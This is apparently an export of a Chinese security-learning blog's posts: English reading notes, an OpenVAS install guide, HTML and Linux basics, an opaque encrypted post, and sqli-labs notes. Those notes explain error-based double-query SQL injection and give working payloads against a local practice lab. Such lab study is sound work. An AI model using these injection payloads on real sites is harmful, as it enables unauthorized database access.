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]]></content>
      <categories>
        <category>0x02 应用实践</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>nmap</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EnglisReading-2]]></title>
    <url>%2F2019%2F01%2F09%2FEnglisReading-2%2F</url>
    <content type="text"><![CDATA[Young children should be taught in their mother tongue, not in English 12tongue:舌头 语言 mother tongue :母语 English perfectly exemplifies the “network effects” of a global tongue: the more people use it, the more useful it is. Over a billion people speak it as either their first or second language; more still as a third or fourth language.12345678exemplifies:作为、、典型the more people use it, the more useful it is. the more 、、、 the more、、、 Over a billion people speak it as either their first or second language as 作为 Parents’ desire for their children to master English is spurring the growth of private schooling. Education authorities are switching to English medium, in part to stem the outflow of children into the private sector.12345678910111213141516171819202122232425master English :master v.精通 --&gt;精通英语spur： n. 鼓舞，刺激；马刺；山坡 vi. 骑马疾驰；给予刺激 vt. 激励，鞭策；给…装踢马刺 n. (Spur)人名；(意)斯普尔；(德)施普尔 spur into action eg：i was spur into action by her speech Education authoritie 教育部门 medium/ˈmiːdiəm/ n. （传播或表达的）媒体，方法；教学媒介语言 e.g. 相关词汇：media (n.) 搭配短语：medium of instruction 例句：English is still the main medium of instruction in Nigeriain part 在一定程度stem ：阻止 to stem the tide of immigrationsector ：部门 这里只学校 Teaching children in English is fine if that is what they speak at home and their parents are fluent in it. But that is not the case in most public and low-cost private schools. Children are taught in a language they don’t understand by teachers whose English is poor. The children learn neither English nor anything else. Research demonstrates that children learn more when they are taught in their mother tongue than they do when they are taught in any other language. In a study of children in the first three years in 12 schools in Cameroon, those taught in Kom did better than those taught in English in all subjects.1demonstrates :证实，证明 English should be an important subject at school, but not necessarily the language of instruction. Rather than switching to English-medium teaching, governments fearful of losing custom to the private sector should look at the many possible ways of improving public schools.123456789101112131415161718language of instruction 教学语言 e.g. instruction 英文释义： the act of teaching sth. to sb. 例句：In Malaysia, the primary language of instruction is English.fearful of :惧怕custom/ˈkʌstəm/ n. （经常性的）顾客，客源 e.g. 相关词汇：customer (n.) 例句：Thank you for your custom.look at 思考，考虑 e.g. 英文释义：to think about, consider or study something]]></content>
      <categories>
        <category>0x05 生活杂项</category>
        <category>English Reading Comprehension</category>
      </categories>
      <tags>
        <tag>EnglishReading</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EnglisReading-1]]></title>
    <url>%2F2019%2F01%2F08%2F%E6%B5%81%E5%88%A9%E9%98%85%E8%AF%BB-1%2F</url>
    <content type="text"><![CDATA[Vaccine could virtually eliminate cervical cancer：study vaccine：疫苗 eg：vaccine against tetaus（破伤风）vaccination 接种 cervical：宫颈的 – cervix 子宫颈 eg：cervial cancer virtually ：实质上，实际上 eg：he was virtually a prisoner be virtually forgotten（几乎被遗忘） The rapid scale-up of the human papillomavirus (HPV) vaccine could virtually eliminate cervical cancer in a handful of rich countries within three decades, and in most other nations by century’s end, researchers said Wednesday. scale-up 扩大 scale v.扩大 增大eg：the scale-up of 5G technology papillomavirus 乳头瘤 a handful of :少量的 minorty 少量的，少数 Without screening and HPV vaccination, more than 44 million women will likely be diagnosed with the disease over the next 50 years, they reported in The Lancet Oncology, a medical journal. screening ：检察，筛选 screen n.屏幕，屏风 v.放映 拍摄 diagnose:诊断 be diagnose with sthhe has recently been diagnosedwith diabetes By contrast, the rapid deployment starting in 2020 of screening and vaccination could prevent more than 13 million cervical cancers by mid-century worldwide, and lower the number of cases to below four-per-100, 000 women, the study found. by contrast 与之相比，相反 in contrast 相比之下 deployment n.部署 应用 v. deploy 部署the deployment of AI technology mid-century 中业 “This is a potential threshold for considering cervical cancer to be eliminated as a major public health problem, “ the authors said in a statement. threshold 门界，门槛，界限 on the threshold of sththey are on the threshold of adulthood “Despite the enormity of the problem, our findings suggest that global elimination is within reach, “ said lead author Karen Canfell, a professor at the Cancer Council New South Wales, in Sydney. enormity 严重性 巨大的 enormous 巨大的 庞大的 within reach 近在咫尺 near by Achieving that goal, however, depends on “both high coverage of HPV vaccination and cervical screening, “ she added. coverage :范围 规模 Clinical trials have shown that HPV vaccines are safe and effective against the two HPV strains—types 16 and 18—responsible for 70 percent of cervical cancer cases. Clinical adj .临床的 clininc 诊所 trials n.试验 审判（trial） strains 变种 变体 The study’s projections presume the vaccination of 80 percent of girls 12 to 15 years old starting in 2020, and that at least 70 percent of women undergo screening twice in their lifetime. projections 预测 presume 假设 This would push the prevalence of the disease below the bar of 4/100, 000 women in countries such as the United States, Canada, Britain and France by 2059, and in mid-income countries such as Brazil and China by 2069, the authors calculate. prevalence ：流行 普及]]></content>
      <categories>
        <category>0x05 生活杂项</category>
        <category>English Reading Comprehension</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs通关挑战]]></title>
    <url>%2F2018%2F08%2F13%2Fupload-labs%E9%80%9A%E5%85%B3%E6%8C%91%E6%88%98%2F</url>
    <content type="text"><![CDATA[0x01文件上传通关挑战 0x02 startpass 01查看网页源代码发现只允许上传jpg|.png|.gif文件（前端禁用）]]></content>
      <categories>
        <category>0x01 web安全</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-lab学习笔记less6-7（双重查询）]]></title>
    <url>%2F2018%2F05%2F07%2F%E5%8F%8C%E9%87%8D%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[双重注入查询:相关函数介绍：对于双重查询，需要先了解count，rand（），floor函数功能以及group by语法用法1.concat函数用法concat（string1，string2，string3）将string1，string2，string3字符串连接起来输出（orcle只允许2个字符串）2.count函数我们可以用 select from information_schema.schemata ,来查询当前数据库信息再根据count函数，我们可以得知当前数据库总数，count函数就是列出当前指定值的数目，count（） freom information_schema.schamata中列出数据库的记录数 3.rand（）函数由下图可以看到，selecr rand（）返回的结果是小于1的随机小数. 4.floor（）函数用法floor向下取整 5.group by 用法 GROUP BY 语句用于结合合计函数，根据一个或多个列对结果集进行分组 双重查询原理研究人员发现，使用group by结合rand（）以及count（*）这样聚集函数，在sql查询时会出现错误，这种错误随机产生，这样就产生的双重查询注入，使用floor函数只是为了将查询结果分类。下面我们来结果几个函数用法,看几个简单的组合 SELECT floor(rand()2);我们从里向外看。rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2了。然后对结果进行取证。就只能是0或1了。也就是这个查询的结果不是1，就是0采用如果 SELECT CONCAT((SELECT database()), FLOOR(RAND()2)); select database()返回用户名，再与floor取整函数取得数字相连，floor（rand（））不是0就是1，所以结果又随机两种，SELECT CONCAT((SELECT database()), FLOOR(RAND()*2))a from user; 如果后面跟一个表名，那么就会返回一个集合，集合大小由表本生条数决定。我的数据库有3个管理员，所以就会返回3条记录。我们选择information_schema.tables表来查询，因为表数据多，产生较多的随机数,然后group by 分组显示出来select concat ((select database())), floor(rand()*2))as a from information_schema.tables group by a;其中concat（）as a 是将查询到的结果取一个别名，然后根据别名分组。 这样mysql0分到一组，mysql1分到一组。就只有两种结果了最后再结合count（*），聚集函数，则会有可能报错，但是注意到报错信息所附带我们需要的信息，而不是正常的报错信息。所以就产生了双重查询12SELECT count(*),CONCAT((SELECT user()), FLOOR(RAND()*2))as a from information_schema.tables group by a;(查询当前用户)SELECT count(*),CONCAT((SELECT version()), FLOOR(RAND()*2))as a from information_schema.tables group by a;（查询数据库版本 深层原理：http://wooyun.jozxing.cc/static/drops/tips-14312.html 大神分享的对于less-6 payload1$ http://127.0.0.1/sqli/Less-6/?id=1" union select count(*),1,concat(0x3a,(select database()),0x3a,floor(rand(0)*2))a from information_schema.tables group by a--+ less-5 payload1$ http://127.0.0.1/sqli/Less-5/?id=1' and 1=( select count(*) from information_schema.tables group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2))) --+]]></content>
      <categories>
        <category>0x01 技术原理</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>双重查询</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[openvas安装]]></title>
    <url>%2F2018%2F02%2F07%2Fopenvas%2F</url>
    <content type="text"><![CDATA[openvas软件介绍OpenVAS是一款开放式的漏洞评估工具，主要用来检测目标网络或主机的安全性，OpenVAS能够基于C/S(客户端/服务器),B/S(浏览器/服务器)架构进行工作，管理员通过浏览器或者专用客户端程序来下达扫描任务，服务器端负载授权，执行扫描操作并提供扫描结果。 服务器层组件openvas-scanner(扫描器):负责调用各种漏洞检测插件，完成实际的扫描操作。openvas-manager(管理器):负责分配扫描任务，并根据扫描结果生产评估报告。 客户层组件openvas-cli(命令行接口):负责提供从命令行访问OpenVAS服务层程序。greenbone-security-assistant(安装助手):负责提供访问OpenVAS服务层的web接口，便于通过浏览器来执行扫描任务，是使用最简便的客户层组件。openvas安装 实验环境：fedora 27 in virtual box（关闭selinux） 1 更新系统软件 sudo yum update -y 2 安装openvas sudo yum intsall openvas* 3 安装redis数据库 sudo yum install redis* 4 安装sqlite3 sudo yum install sqlite3 5 安装证书生成工具 sudo yum install gnutls-utils 6 编译redis 配置文件 sudo vi /etc/redis.conf取消以下两行注释 12# unixsocket /tmp/redis.sock# unixsocketperm 700 7 运行redis服务 sudo redis-server /etc/redis.conf &amp;(&amp;守护程序，后台运行) 8 解决安装问题检查是否安装成功（openvas-check-setup命令指导安装openvas安装问题） 根据提示进一步操作 sudo openvas-check-setup –v9 按照fix提示，可需要如下命令 下载nvt库sudo greenbone-nvt-sync建立本地scapdata数据库sudo greenbone-scapdata-sync获取证书文件sudo grennbone-certdata-sync创建所需要的目录sudo mkdir -p /var/lib/openvas/openvasmd/gnupg/ (-p表示递归创建目录) 9启动scanner sudo openvassd 10 重建数据库 sudo openvasmd –rebuild 11创建用户admin sudo openvasmd –user=admin –new-password=password(password为自己所设密码) 12 生成证书 sudo openvas-manage-certs -a 13 启动greenbone security assistant sudo gsad –listen=127.0.0.1 –port=9392 14 启动openvas管理器 sudo openvassmd 使用openvas-check-setup -v9 出现it seem like your openvas-9 installation is ok 表示安装成功 登录openvas浏览器在浏览器输入https://127.0.0.1:9392(https不可省略)添加信任 advaced-&gt;add exception-&gt;confirm security exception登录admin 和所设密码进入openvas 补充知识需要对扫描配置做一些更改，为之后端口扫描准备 /var/lib/openvas/plugins/nmap.nasl 对nmap.nasl修改407:if(ver)改成if（svc）,411:log_message最后ver前面添加svc388:后面添加花括号，并且在418对花括号闭合413：svc改为string 最后重启openvass]]></content>
      <categories>
        <category>0x02 应用实践</category>
        <category>软件安装</category>
      </categories>
      <tags>
        <tag>openvass</tag>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html学习笔记（一）]]></title>
    <url>%2F2018%2F02%2F07%2Fhtml%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[什么是html：html是一种网页描述语言，html使用标记标签来描述网页，web浏览器作用是读取html文档，并且以网页的形式显示它们，浏览器不会显示html标签，而是使用标签来解释页面的内容html基础知识—-html标题HTML 标题（Heading）是通过&lt; h1&gt; - &lt; h6&gt; 等标签进行定义的123&lt;h1&gt;This is a heading&lt;/h1&gt;&lt;h2&gt;This is a heading&lt;/h2&gt;&lt;h3&gt;This is a heading&lt;/h3&gt; html段落HTML 段落是通过 &lt; p&gt; 标签进行定义的。1&lt;p&gt;This is a paragraph.&lt;/p&gt; html链接HTML 链接是通过 &lt; a&gt; 标签进行定义的。1&lt;a href="http://www.baidu.com"&gt;This is a link&lt;/a&gt; 注释：在 href 属性中指定链接的地址。 html图像HTML 图像是通过 &lt; img&gt; 标签进行定义的。1&lt;img src="w3school.jpg" width="104" height="142" /&gt; HTML 标签对大小写不敏感：&lt; P&gt; 等同于 &lt; p&gt;许多网站都使用大写的 HTML 标签。 html水平线&lt; hr&gt; 标签在 HTML 页面中创建水平线。hr 元素可用于分隔内容。12&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;hr&gt; html注释可以将注释插入HTML代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们1&lt;!-- 这是一个注释 --&gt; 可以将注释插入HTML代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们]]></content>
      <categories>
        <category>0x05 生活杂项</category>
        <category>html</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>网页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 命令]]></title>
    <url>%2F2018%2F02%2F05%2Flinux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[linux基本命令Linux系统下基本命令（要区分大小写 ）uname 显示版本信息（同win2K的 ver）dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）pwd 查询当前所在的目录位置cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。cat 文件名 查看文件内容cat &gt;abc.txt 往abc.txt文件中写上内容。more 文件名 以一页一页的方式显示一个文本文件。cp 复制文件mv 移动文件rm 文件名 删除文件，rm -a 目录名删除目录及子目录mkdir 目录名 建立目录rmdir 删除子目录，目录内没有文档。chmod 设定档案或目录的存取权限grep 在档案中查找字符串diff 档案文件比较find 档案搜寻date 现在的日期、时间who 查询目前和你使用同一台机器的人以及Login时间地点w 查询目前上机者的详细资料whoami 查看自己的帐号名称groups 查看某人的Grouppasswd 更改密码history 查看自己下过的命令ps 显示进程状态kill 停止某进程gcc 黑客通常用它来编译C语言写的文件su 权限转换为指定使用者telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。ftp ftp连接上某服务器（同win2K） bash_history 显示系统命令时间123# echo 'HISTTIMEFORMAT="%F %T "' &gt;&gt; ~/.bashrc或# echo 'HISTTIMEFORMAT="%F %T "' &gt;&gt; ~/.bash_profile 在bashrc添加如下命令：123456789101112readonly HISTFILE // 更改历史文件名称:HISTFILE=/var/history/$USER-$UID.logreadonly HISTFILESIZE // 定义了在 .bash_history 中保存命令的记录总数.readonly HISTSIZE //控制历史命令的总数readonly HISTCMDreadonly HISTCONTROL //剔除连续的重复条目HISTCONTROL=ignoredups # 使用HISTCONTROL来消除命令历史中的连续重复条目 HISTCONTROL=erasedups # 使用HISTCONTROL在整个历史中去除重复命令 HISTCONTROL=ignorespace # 使用HISTCONTROL强制history忽略某条特定命令(这里是空格)readonly HISTIGNORE #存储历史命令时忽略特殊命令# readonly linux只读命令#为history添加时间戳export HISTTIMEFORMAT='%F %T ' source ~/.bashrc或source ~/.bash_profile chattr 命令chattr +i test.txt 设置只可读 +i -i 去除可读限制chattr +a test.txt 设置只能追加？（append-only） -a取消chattr -R +i ./test-dir/ 对目录所有文件添加限制相关命令如下： a：让文件或目录仅供附加用途。b：不更新文件或目录的最后存取时间。c：将文件或目录压缩后存放。d：将文件或目录排除在倾倒操作之外。i：不得任意更动文件或目录。s：保密性删除文件或目录。S：即时更新文件或目录。u：预防意外删除。]]></content>
      <categories>
        <category>0x03 操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>命令</tag>
      </tags>
  </entry>
</search>
